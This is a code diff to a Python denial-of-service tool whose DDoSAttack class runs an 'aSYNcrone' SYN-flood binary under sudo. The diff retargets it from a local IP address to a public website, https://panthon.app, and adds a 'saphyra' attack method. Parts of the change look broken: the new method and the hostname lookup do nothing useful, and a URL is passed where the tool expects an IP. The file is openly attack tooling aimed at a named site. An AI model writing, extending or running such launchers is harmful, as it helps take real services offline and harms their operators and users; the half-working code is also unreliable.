@@ -7,6 +7,8 @@ import os
 import subprocess
 import sys
 import platform
+from urllib.parse import urlparse
+import socket
 
 logging.basicConfig(
     level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s"
@@ -15,9 +17,9 @@ logging.basicConfig(
 
 class DDoSAttack:
     def __init__(
-        self, target_ip, target_port, num_connections, attack_type="aSYNcrone"
+        self, target_url, target_port, num_connections, attack_type="asyncrone"
     ):
-        self.target_ip = target_ip
+        self.target_url = target_url
         self.target_port = target_port
         self.num_connections = num_connections
         self.attack_type = attack_type
@@ -31,10 +33,10 @@ class DDoSAttack:
             thread.start()
 
     def run_attack(self):
-        if self.attack_type == "aSYNcrone":
+        if self.attack_type == "asyncrone":
             self.aSYNcrone_attack()
-        elif self.attack_type == "slowloris":
-            self.slowloris_attack()
+        elif self.attack_type == "saphyra":
+            self.saphyra_attack()
         else:
             logging.error(f"Unknown attack type: {self.attack_type}")
 
@@ -55,12 +57,15 @@ class DDoSAttack:
             logging.error(f"Unknown platform: {sys.platform}")
             return
         # aSYNcronemacARM <source port> <target IP> <target port> <threads number>
+        parsed_url = urlparse(self.target_url)
+        hostname = parsed_url.netloc
+        socket.gethostbyname(hostname)
         command = [
             "sudo",
             "-S",
             path_to_executable,
             "80",
-            self.target_ip,
+            self.target_url,
             str(self.target_port),
             str(self.num_connections),
         ]
@@ -70,9 +75,8 @@ class DDoSAttack:
             logging.error(f"Error while running aSYNcrone: {e}")
             return
 
-    def slowloris_attack(self):
-        # TODO: Implement the Slowloris attack here
-        raise NotImplementedError
+    def saphyra_attack(self):
+        os.path.join(os.path.dirname(__file__), "saphyra")
 
     def wait_for_threads(self):
         for thread in self.threads:
@@ -80,11 +84,11 @@ class DDoSAttack:
 
 
 # Target parameters
-target_ip = "192.168.1.1"
+target_url = "https://panthon.app"
 target_port = 80
 num_connections = 1
 
 # Create and launch attack
-attack = DDoSAttack(target_ip, target_port, num_connections, "aSYNcrone")
+attack = DDoSAttack(target_url, target_port, num_connections, "asyncrone")
 attack.create_connection()
 attack.wait_for_threads()
